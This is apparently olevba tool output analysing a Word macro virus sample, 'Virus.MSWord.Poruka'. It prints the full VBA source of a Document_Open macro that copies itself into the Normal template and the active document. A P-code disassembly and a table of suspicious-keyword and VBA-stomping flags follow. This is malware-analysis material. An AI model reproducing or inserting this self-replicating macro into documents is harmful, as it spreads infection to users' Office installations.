olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poruka
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poruka - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'poruka
Private Sub Document_Open()
Dim a, b, c
c = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 16): GoTo f
f: b = Strings.LTrim$(c): a = b: GoTo provjera
provjera: If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> "'poruka" Then GoTo k
k: With NormalTemplate.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
.InsertLines 1, a: GoTo l
End With
l: If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 1) <> "'poruka" Then GoTo i
i: With ActiveDocument.VBProject.VBComponents(1).CodeModule
.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
.InsertLines 1, a: GoTo kraj
End With
kraj: End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Poruka
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3029 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0006 "poruka"
' Line #1:
' 	FuncDefn (Private Sub ActiveDocument())
' Line #2:
' 	Dim 
' 	VarDefn a
' 	VarDefn B
' 	VarDefn c
' Line #3:
' 	LitDI2 0x0001 
' 	LitDI2 0x0010 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St c 
' 	BoS 0x0000 
' 	GoTo F 
' Line #4:
' 	Label F 
' 	Ld c 
' 	Ld Strings 
' 	ArgsMemLd LTrim$ 0x0001 
' 	St B 
' 	BoS 0x0000 
' 	Ld B 
' 	St a 
' 	BoS 0x0000 
' 	GoTo provjera 
' Line #5:
' 	Label provjera 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "'poruka"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo DeleteLines 
' 	EndIf 
' Line #6:
' 	Label DeleteLines 
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd InsertLines 
' 	ArgsMemCallWith CountOfLines 0x0002 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld a 
' 	ArgsMemCallWith l 0x0002 
' 	BoS 0x0000 
' 	GoTo MsgBox 
' Line #9:
' 	EndWith 
' Line #10:
' 	Label MsgBox 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "'poruka"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo kraj 
' 	EndIf 
' Line #11:
' 	Label kraj 
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld i 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd InsertLines 
' 	ArgsMemCallWith CountOfLines 0x0002 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld a 
' 	ArgsMemCallWith l 0x0002 
' 	BoS 0x0000 
' 	GoTo _B_var_Set 
' Line #14:
' 	EndWith 
' Line #15:
' 	Label _B_var_Set 
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

